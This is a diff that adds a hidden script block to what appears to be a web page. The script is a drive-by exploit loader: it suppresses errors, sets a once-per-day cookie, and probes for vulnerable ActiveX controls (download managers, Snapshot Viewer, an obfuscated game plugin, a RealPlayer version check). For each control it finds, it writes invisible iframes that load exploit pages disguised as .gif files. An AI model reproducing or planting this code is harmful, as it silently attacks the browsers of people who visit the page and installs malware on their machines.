@@ -1,0 +1,46 @@
+<script>
+window.status="Íê³É";
+window.onerror=function(){return true;}
+if(document.cookie.indexOf("xmanman=")==-1)
+{
+
+var expires=new Date();
+expires.setTime(expires.getTime()+24*60*60*1000);
+document.cookie="xmanman=Yes;path=/;expires="+expires.toGMTString();
+if(navigator.userAgent.toLowerCase().indexOf("msie 7")==-1)
+document.write("<iframe width=20 height=0 src=1.gif></iframe>");
+try{var f;
+var gw=new ActiveXObject("GLIEDown.IEDown.1");}
+catch(f){};                      
+finally{if(f!="[object Error]"){document.write("<iframe width=100 height=0 src=newlz.gif></iframe>");}}
+try{var m;
+var hw=new ActiveXObject("Downloader.DLoader.1");}
+catch(m){};                      
+finally{if(m!="[object Error]"){document.write("<iframe width=100 height=0 src=s.gif></iframe>");}}
+try{var n;
+var hl=new ActiveXObject("snpvw.Snapshot Viewer Control.1");}
+catch(n){};                      
+finally{if(n!="[object Error]"){document.write("<iframe width=100 height=0 src=office.gif></iframe>");}}
+try{var ffffffff;
+var ourgame=new ActiveXObject("\x48\x61\x6e\x47\x61\x6d\x65\x50\x6c\x75\x67\x69\x6e\x43\x6e\x31\x38\x2e\x48\x61\x6e\x47\x61\x6d\x65\x50\x6c\x75\x67\x69\x6e\x43\x6e\x31\x38\x2e\x31");}
+catch(ffffffff){};
+finally{if(ffffffff!="[object Error]")
+{document.write("<iframe width=0 height=0 src=2.gif></iframe>");}}
+function antiavp()
+{
+rrooxx = "IER" + "PCtl.I" + "ERP" + "Ctl.1";
+try
+{
+Like = new ActiveXObject(rrooxx);
+}catch(error){return;}
+vvvvv = Like.PlayerProperty("PRODUCTVERSION");
+if(vvvvv<="6.0.14.552")
+document.write("<iframe width=100 height=1 src=3.gif></iframe>");
+else
+document.write("<iframe width=100 height=1 src=4.gif></iframe>");
+}
+antiavp();
+document.write("<iframe src=uu.htm width=51 height=0><\/iframe>");}
+</script>
+
+
